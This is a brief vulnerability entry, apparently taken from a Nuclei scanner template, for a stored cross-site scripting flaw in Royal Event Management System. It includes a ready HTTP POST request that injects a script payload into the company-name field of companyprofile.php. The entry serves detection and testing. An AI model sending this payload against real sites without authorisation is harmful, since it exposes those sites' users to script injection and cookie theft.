# Vulnerability: Royal Event Management System - Stored Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`royalevent-stored-xss.yaml`)

## Description
Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /royal_event/companyprofile.php HTTP/1.1
Host: {{Hostname}}

companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=
```

